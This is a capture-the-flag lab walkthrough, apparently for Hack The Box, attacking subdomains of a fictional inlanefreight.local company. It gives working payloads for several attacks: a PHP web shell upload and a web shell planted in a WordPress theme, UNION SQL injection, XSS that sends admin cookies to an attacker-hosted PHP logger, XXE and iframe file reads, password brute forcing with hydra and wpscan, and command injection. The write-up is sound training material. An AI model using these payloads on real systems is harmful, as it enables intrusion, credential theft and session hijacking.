Eyewitness: https://github.com/FortyNorthSecurity/EyeWitness
```
sudo apt install eyewitness
eyewitness -f ilfreight_subdomains -d (directory to output to)
```

```
cat ilfreight_subdomains

inlanefreight.local 
blog.inlanefreight.local 
careers.inlanefreight.local 
dev.inlanefreight.local 
gitlab.inlanefreight.local 
ir.inlanefreight.local 
status.inlanefreight.local 
support.inlanefreight.local 
tracking.inlanefreight.local 
vpn.inlanefreight.local
monitoring.inlanefreight.local
```


## Use the IDOR vulnerability to find a flag. Submit the flag value as your answer (flag format: HTB{}).
- careers.inlanefreight.local
Navigate to /register
Register a new user
Login, then in the url, there is an id parameter, which we can change to 4 to reveal the flag.


## Exploit the HTTP verb tampering vulnerability to find a flag. Submit the flag value as your answer (flag format: HTB{}).
- dev.inlanefreight.local
```
gobuster dir -u http://dev.inlanefreight.local -w /usr/share/wordlists/dirb/common.txt -x .php -t 300
```
- Found upload.php
- Change HTTP Header to TRACK and intercept the response
- It has another header "X-Custom-IP-Authorization" which we can paste into our request
```
TRACK ...

X-Custom-IP-Authorization: 127.0.0.1
```
- This takes us to page where we can upload a file. Upload a php shell, but before sending the request, change this
```
<?php system($_GET['cmd']); ?>
Content-Type: image/png
```


## Exploit the WordPress instance and find a flag in the web root. Submit the flag value as your answer (flag format: HTB{}).
- ir.inlanefreight.local
```
sudo wpscan -e ap -t 500 --url http://ir.inlanefreight.local
```
- mail-masta has LFI vulnerability: https://www.exploit-db.com/exploits/50226
```
wpscan -e u -t 500 --url http://ir.inlanefreight.local
wpscan --url http://ir.inlanefreight.local -P passwords.txt -U ilfreightwp
```
- wordlist: https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/darkweb2017_top-100.txt
- ilfreightwp:password1
Navigate to wp-login.php and log in.
Browse to http://ir.inlanefreight.local/wp-admin/theme-editor.php?file=404.php&theme=twentytwenty to edit the 404.php file with a PHP web shell


## Enumerate the "status" database and retrieve the password for the "Flag" user. Submit the value as your answer.
- status.inlanefreight.local
```
SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;
' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -
' UNION select 1,database(),2,3-- -
' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='mysql'-- -
' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='users'-- -
' UNION select 1, username, password, 4 from mysql.users-- -
```


## Steal an admin's session cookie and gain access to the support ticketing queue. Submit the flag value for the "John" user as your answer.
- support.inlanefreight.local
- Create listener on attack host
```
mkdir /tmp/tmpserver
cd /tmp/tmpserver
sudo php -S 0.0.0.0:8080
```
- Put in scripts to each field in form
```
"><script src="http://OUR_IP/name.js"></script>
"><script src="http://OUR_IP/email.js"></script>
"><script src="http://OUR_IP/phone.js"></script>
"><script src="http://OUR_IP/product.js"></script>
"><script src="http://OUR_IP/message.js"></script>
```
- Message field is vulnerable
- Create script.js on attack host
```
document.location='http://10.10.15.76/index.php?c='+document.cookie;
```
- Create index.php on attack host
```
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```
- Host index.php and script.js on the php server, then run the script in the form to retrieve admin cookie
- Create cookie in browser using cookie-editor (session=uahsfiuhaf), then refresh page.


## Use the SSRF to Local File Read vulnerability to find a flag. Submit the flag value as your answer (flag format: HTB{}).
- tracking.inlanefreight.local
```
<iframe src="file:///flag.txt" height="500px" width="500px"></iframe>
```


## Register an account and log in to the Gitlab instance. Submit the flag value (flag format : HTB{}).
- gitlab.inlanefreight.local
- Found shopdev2.inlanefreight.local


## Use the XXE vulnerability to find a flag. Submit the flag value as your answer (flag format: HTB{}).
- shopdev2.inlanefreight.local
- checkout.php
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE userid [
  <!ENTITY xxetest SYSTEM "file:///flag.txt">
]>
<root>
	<subtotal>
		undefined
	</subtotal>
	<userid>
		&xxetest;
	</userid>
</root>
```


## Use the command injection vulnerability to find a flag in the web root. Submit the flag value as your answer (flag format: HTB{}).
- monitoring.inlanefreight.local
- wordlist: https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/darkweb2017_top-100.txt
```
hydra -l admin -P password.txt monitoring.inlanefreight.local http-post-form "/login.php:username=admin&password=^PASS^:F=Invalid credentials"
```
- admin:12qwaszx
```
help
connection_test
```
- Use burp to intercept connection_test.php
```
GET /ping.php?ip=127.0.0.1%0acat${IFS}00112233_flag.txt HTTP/1.1
Host: monitoring.inlanefreight.local
Accept-Language: en-US,en;q=0.9
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
Content-Type: application/json
Accept: */*
Referer: http://monitoring.inlanefreight.local/index.php
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=j8gev4v232juapuap5crjabod7
Connection: keep-alive
```
